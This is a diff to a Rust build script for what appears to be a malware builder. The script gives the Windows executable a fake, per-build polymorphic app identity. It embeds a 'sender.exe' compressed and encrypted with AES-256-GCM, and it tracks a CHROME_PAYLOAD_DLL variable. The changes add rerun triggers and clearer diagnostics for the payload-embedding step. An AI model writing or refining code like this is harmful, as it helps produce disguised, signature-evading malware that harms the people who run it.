@@ -75,6 +75,12 @@ fn main() {
     let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
     let out_dir = PathBuf::from(env::var("OUT_DIR").expect("OUT_DIR not set"));
 
+    // Must be emitted every run so Cargo tracks env changes between build passes.
+    println!("cargo:rerun-if-env-changed=SENDER_EXE");
+    println!("cargo:rerun-if-env-changed=SKIP_SENDER_EMBED");
+    println!("cargo:rerun-if-env-changed=SENDER_EMBED_PASS");
+    println!("cargo:rerun-if-env-changed=CHROME_PAYLOAD_DLL");
+
     // Embed Windows resources — fake app identity, polymorphic per build.
     // All details are invented; the app and company do not exist.
     // The profile is selected pseudo-randomly from the seed so it changes
@@ -190,9 +196,6 @@ fn main() {
     fs::write(&sender_key_path,   &sender_key).expect("write sender_key.bin");
     fs::write(&sender_nonce_path, &sender_nonce).expect("write sender_nonce.bin");
 
-    println!("cargo:rerun-if-env-changed=SENDER_EXE");
-    println!("cargo:rerun-if-env-changed=SKIP_SENDER_EMBED");
-
     let sender_candidates = [
         env::var("SENDER_EXE").ok().map(PathBuf::from),
         Some(manifest_dir.join("target/release/sender.exe")),
@@ -208,11 +211,11 @@ fn main() {
         println!("cargo:warning=sender embed skipped (sender build pass)");
         Vec::new()
     } else if let Some(sender_path) = sender_candidates
-        .into_iter()
+        .iter()
         .flatten()
         .find(|p| p.exists() && p.metadata().map(|m| m.len()).unwrap_or(0) > 0)
     {
-        let sender_bytes = fs::read(&sender_path).expect("read sender.exe");
+        let sender_bytes = fs::read(sender_path).expect("read sender.exe");
         let obf = obfuscate_aes(&sender_bytes, &sender_key, &sender_nonce);
         println!(
             "cargo:warning=embedded sender (deflate+AES-256-GCM) from {} ({} -> {} bytes)",
@@ -223,7 +226,15 @@ fn main() {
         println!("cargo:rerun-if-changed={}", sender_path.display());
         obf
     } else {
-        println!("cargo:warning=sender.exe not found — embedded sender disabled (inline fallback)");
+        let checked: Vec<String> = sender_candidates
+            .iter()
+            .flatten()
+            .map(|p| format!("{} exists={}", p.display(), p.exists()))
+            .collect();
+        println!(
+            "cargo:warning=sender.exe not found — embedded sender disabled (inline fallback); checked: {}",
+            checked.join("; ")
+        );
         Vec::new()
     };
 
